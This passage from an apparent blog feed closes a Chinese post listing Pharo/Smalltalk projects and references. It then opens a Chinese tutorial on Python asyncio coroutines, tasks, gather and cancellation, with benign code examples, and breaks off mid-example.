&lt;li&gt;&lt;a href="https://gtoolkit.com/"&gt;gtoolkit&lt;/a&gt;: We want the environment to fit the context of the current system and when it does not, we want to mold it seamlessly. This change is transformational.&lt;ul&gt;
&lt;li&gt;Programming is the coolest job on the planet, and it should feel like that all the time.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/feenkcom/gtoolkit"&gt;gtoolkit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://moosetechnology.org/"&gt;Moose&lt;/a&gt;: Moose is a platform for software and data analysis. &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/moosetechnology/Moose"&gt;github.com/moosetechnology/Moose&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ba-st/Winter"&gt;Winter&lt;/a&gt;: Winter is a 2D game engine for Pharo Smalltalk &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bouraqadi/PharoJS"&gt;PharoJS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/juliendelplanque/Python3Generator"&gt;Python3Generator&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/guillep/Scale"&gt;Scale&lt;/a&gt;: Pharo in the shell&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-contributions/OSSubprocess"&gt;OSSubprocess&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SeasideSt/Seaside"&gt;Seaside&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/svenvc/ston"&gt;ston&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-ide/TelePharo"&gt;TelePharo&lt;/a&gt;: Tools to manage and develop remote Pharo images&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-iot/PharoThings"&gt;PharoThings&lt;/a&gt;:Live programming platform for IoT projects based on Pharo&lt;ul&gt;
&lt;li&gt;Raspberry driven by WiringPi library&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=0H9of7PQet0"&gt;a demo about low level board model&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Arduino driven by Firmata, soon&lt;/li&gt;
&lt;li&gt;Beaglebone, soon&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SquareBracketAssociates/EnterprisePharo"&gt;EnterprisePharo&lt;/a&gt;:  A new book describing Pharo librairies to make business. &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-open-documentation/pharo-wiki"&gt;pharo-wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-graphics/Bloc"&gt;Bloc&lt;/a&gt;:  Low-level UI infrastructure &amp;amp; framework for Pharo&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/svenvc/zinc"&gt;zinc&lt;/a&gt;: Zinc HTTP Components is an open-source Smalltalk framework to deal with the HTTP networking protocol.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/svenvc/P3"&gt;P3&lt;/a&gt;: A lean and mean PostgreSQL client for Pharo&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ronsaldo/woden"&gt;woden&lt;/a&gt;:  World Dynamic Engine - A 3D graphics engine for Pharo&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zeroflag/Teapot"&gt;Teapot&lt;/a&gt;: Teapot micro web framework for Pharo Smalltalk&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/VincentBlondeau/Cruiser"&gt;Cruiser&lt;/a&gt;: A Pharo Tool to package applications&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-nosql/voyage"&gt;voyage&lt;/a&gt;: an object persistence abstraction layer for Pharo.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jmari/JupyterTalk"&gt;JupyterTalk&lt;/a&gt;: Pharo Smaltalk kernel for Jupyter:  It uses ZeroMQ ported from &lt;a href="http://smalltalkhub.com/#!/~panuw/zeromq"&gt;zeromq&lt;/a&gt; project to uFFI！！！&lt;ul&gt;
&lt;li&gt;&lt;a href="http://smalltalkhub.com/#!/~panuw/zeromq"&gt;zeromq&lt;/a&gt;: ZeroMQ bindings for Pharo. Currently uses FFI interface. Supports ZeroMQ versions 2 and 3 (2.2 and 3.2 at least)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/unchartedworks/SmalltalkVimMode"&gt;SmalltalkVimMode&lt;/a&gt;: Vim Mode for Playground, System Browser, Debugger in Pharo.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hernanmd/pi"&gt;pi&lt;/a&gt;:Pharo Install - A CLI tool for installing Pharo Smalltalk packages (pip-like)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/svenvc/NeoJSON"&gt;NeoJSON&lt;/a&gt;: read and write JSON converting to or from Smalltalk objects.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pavel-krivanek/terminal"&gt;terminal&lt;/a&gt;:Pseudoterminal emulator for Pharo&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-nosql/mongotalk"&gt;mongotalk&lt;/a&gt;: A Pharo driver for MongoDB&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/astares/Pharo-Chrome"&gt;Pharo-Chrome&lt;/a&gt;: Pharo support for Google Chrome&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ObjectProfile/KerasWrapper"&gt;KerasWrapper&lt;/a&gt;: Keras bindings for Pharo&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bergel.eu/MyPapers/Infa18a-Keras.pdf"&gt;Experience in Bridging Keras for Python with Pharo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/juliendelplanque/JRPC"&gt;JRPC&lt;/a&gt;: JSON-RPC 2.0 implementation for Pharo Smalltalk&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.drgeo.eu/home"&gt;Dr Geo&lt;/a&gt;: A software to design &amp;amp; manipulate interactive geometric sketches. It helps kids to explore geometry.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_6"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/Why-does-Smalltalk-not-become-a-commonly-used-platform-for-learning-presentations-and-video-lecture-constructors-Squeak-looks-great-as-an-interactive-presentation-platform-for-college-lecturers"&gt;Why does Smalltalk not become a commonly used platform for learning presentations and video lecture constructors? Squeak looks great as an interactive presentation platform for college lecturers.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-book-s-would-you-recommend-to-a-computer-science-student"&gt;What book(s) would you recommend to a computer science student?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/Is-there-a-programming-language-thats-effectively-a-successor-to-Smalltalk"&gt;Is there a programming language that's effectively a successor to Smalltalk?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-does-Alan-Kay-use-in-lieu-of-PowerPoint"&gt;What does Alan Kay use in lieu of PowerPoint?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/As-a-beginner-what-are-the-best-ways-to-approach-Computer-Science"&gt;As a beginner, what are the best ways to approach Computer Science?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.vpri.org/pdf/rn2005001_learning.pdf"&gt;Squeak Etoys, Children &amp;amp; Learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-does-Alan-Kay-think-of-using-either-Squeak-or-Pharo-as-the-first-language-for-introducing-programming"&gt;What does Alan Kay think of using either Squeak or Pharo as the first language for introducing programming?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/EarlyHistoryOfSmalltalk/#p53"&gt;The Early History Of Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cs.virginia.edu/~evans/cs655/readings/smalltalk.html"&gt;Design Principles Behind Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/morning-light/smalltalk-and-raspberry-pi-8d85793b132f"&gt;Smalltalk and Raspberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/smalltalk-talk/behold-pharo-the-modern-smalltalk-38e132c46053"&gt;Behold Pharo: The Modern Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/back-to-the-future-with-smalltalk-57c68fab583a"&gt;Back to the Future with Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pharo-open-documentation/awesome-pharo"&gt;awesome-pharo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 19 Mar 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-03-19:from-python-to-pharo.html</guid><category>coding</category></item><item><title>Python异步编程笔记</title><link>/python-asyncio-note.html</link><description>&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;前些日子花了不少时间重构&lt;a href="http://codelab-adapter-docs.codelab.club"&gt;codelab-adapter&lt;/a&gt;和增加新特性。&lt;/p&gt;
&lt;p&gt;&lt;a href="http://codelab-adapter-docs.codelab.club"&gt;codelab-adapter&lt;/a&gt;核心部分是异步的。&lt;/p&gt;
&lt;p&gt;陆续写了一些异步代码，读了不少异步编程相关的技术文章，踩了一些坑，也学了一些技巧，在此做个梳理。&lt;/p&gt;
&lt;h1 id="python"&gt;Python与异步编程&lt;/h1&gt;
&lt;p&gt;正如&lt;a href="https://realpython.com/async-io-python/"&gt;Python中的异步IO：完整的演练&lt;/a&gt;一文所言，Async IO是一种并发编程设计，在Python中得到了专门的支持，从Python 3.4到3.7在迅速发展着，目前还在不断变化中。所以抛掉那些老旧的教程，扔掉那些谈论&lt;code&gt;yeild from&lt;/code&gt;的教程就对了。&lt;/p&gt;
&lt;p&gt;如果你是初学者，专注在新的异步原语(async/await)上， 别去管它的底层是不是&lt;code&gt;yeild&lt;/code&gt;实现的，对于实现原理你应该完全抛开。正如你在Python中写下&lt;code&gt;print("hello world")&lt;/code&gt;时，不必理解Python(CPython)中的&lt;code&gt;print&lt;/code&gt;函数在C语言层面是怎么实现的，专注在你当下正在学习的概念上，别让无关紧要的复杂度压垮你。&lt;/p&gt;
&lt;h3 id="_2"&gt;并行与并发&lt;/h3&gt;
&lt;p&gt;前头提到Async IO是一种&lt;code&gt;并发&lt;/code&gt;编程设计，我们先来解释下&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%B9%B6%E5%8F%91%E6%80%A7"&gt;并发&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%B9%B6%E5%8F%91%E6%80%A7"&gt;并发&lt;/a&gt;与&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97"&gt;并行&lt;/a&gt;是常常被同时提及的概念。&lt;/p&gt;
&lt;p&gt;按维基百科说法:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;并行计算（英语：parallel computing）一般是指许多指令得以同时进行的计算模式。
 并发性（英语：Concurrency）是指在一个系统中，拥有多个计算，这些计算有同时执行的特性，而且他们之间有着潜在的交互。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;并行性指&lt;code&gt;同时&lt;/code&gt;执行多个操作。并发性是一个比并行性更广泛的术语。它表明多个任务&lt;code&gt;能够&lt;/code&gt;以重叠的方式运行。&lt;/p&gt;
&lt;p&gt;async IO是一种并发编程风格(单线程)，它不具有并行性，与js默认采用的编程模型相似。&lt;/p&gt;
&lt;p&gt;以下内容假设在你本地 &lt;code&gt;Python&amp;gt;=3.7&lt;/code&gt;&lt;/p&gt;
&lt;h1 id="hello-world"&gt;hello world&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python3.7&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;world&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="c1"&gt;# hello&lt;/span&gt;
&lt;span class="c1"&gt;# world&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id="awaitables"&gt;&lt;a href="https://docs.python.org/3.8/library/asyncio-task.html#awaitables"&gt;可等待对象(Awaitables)&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;如果一个对象可以在 await 语句中使用，那么它就是 &lt;a href="https://docs.python.org/3.8/library/asyncio-task.html#awaitables"&gt;可等待&lt;/a&gt; 对象。许多 asyncio API 都被设计为接受可等待对象。&lt;/p&gt;
&lt;p&gt;可等待 对象有三种主要类型: 协程(coroutines), 任务(Tasks) 和 Future.&lt;/p&gt;
&lt;h3 id="_3"&gt;协程&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nested&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# Nothing happens if we just call &amp;quot;nested()&amp;quot;.&lt;/span&gt;
    &lt;span class="c1"&gt;# A coroutine object is created but not awaited,&lt;/span&gt;
    &lt;span class="c1"&gt;# so it *won&amp;#39;t run at all*.&lt;/span&gt;
    &lt;span class="n"&gt;nested&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# Let&amp;#39;s do it differently now and await it:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;nested&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;  &lt;span class="c1"&gt;# will print &amp;quot;42&amp;quot;.&lt;/span&gt;

&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在官方文档中, "协程" 可用来表示两个紧密关联的概念:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协程函数: 定义形式为 &lt;code&gt;async def&lt;/code&gt; 的函数; (&lt;code&gt;async def nested()&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;协程对象: 调用 协程函数 所返回的对象。(&lt;code&gt;nested()&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="tasks"&gt;任务(Tasks)&lt;/h3&gt;
&lt;p&gt;Tasks用于&lt;code&gt;并发&lt;/code&gt;执行协程。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nested&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# Schedule nested() to run soon concurrently&lt;/span&gt;
    &lt;span class="c1"&gt;# with &amp;quot;main()&amp;quot;.&lt;/span&gt;
    &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nested&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; 
    &lt;span class="c1"&gt;# 在 Python 3.7 之前，可以改用低层级的 asyncio.ensure_future() 函数。&lt;/span&gt;
    &lt;span class="c1"&gt;# task = asyncio.ensure_future(coro())&lt;/span&gt;


    &lt;span class="c1"&gt;# &amp;quot;task&amp;quot; can now be used to cancel &amp;quot;nested()&amp;quot;, or&lt;/span&gt;
    &lt;span class="c1"&gt;# can simply be awaited to wait until it is complete:&lt;/span&gt;
    &lt;span class="c1"&gt;# 可以类比为thread start，携程api与线程api有很多相似之处&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;

&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;任务会在 &lt;code&gt;get_running_loop()&lt;/code&gt; 返回的循环中执行，如果当前线程没有在运行的循环则会引发 &lt;code&gt;RuntimeError&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;官方例子很糟糕，没有演示&lt;strong&gt;并发&lt;/strong&gt;， 给出一个并发演示。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;coro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;#39;IO&amp;#39; wait time is proportional to the max element.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;coro&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
    &lt;span class="n"&gt;t2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;coro&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;  &lt;span class="c1"&gt;# Python 3.7+&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Start:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%X&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;t2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;End:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%X&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;# Should be 10 seconds&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Both tasks done: {all((t.done(), t2.done()))}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; a = asyncio.run(main())
Start: 16:20:11
End: 16:20:21
Both tasks done: True
&amp;gt;&amp;gt;&amp;gt; a
[[1, 2, 3], [0, 5, 10]]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;并发&lt;/code&gt;执行协程还可用&lt;a href="https://docs.python.org/zh-cn/3.8/library/asyncio-task.html#running-tasks-concurrently"&gt;asyncio.gather&lt;/a&gt;。 如果所有可等待对象都成功完成，结果将是一个由所有返回值聚合而成的列表。结果值的顺序与 aws 中可等待对象的顺序一致。&lt;/p&gt;
&lt;h4 id="task"&gt;请求取消 Task 对象。&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;cancel_me&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cancel_me(): before sleep&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# Wait for 1 hour&lt;/span&gt;
        &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3600&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CancelledError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cancel_me(): cancel sleep&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt;
    &lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cancel_me(): after sleep&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# Create a &amp;quot;cancel_me&amp;quot; Task&lt;/span&gt;
    &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cancel_me&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

    &lt;span class="c1"&gt;# Wait for 1 second&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cancel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;
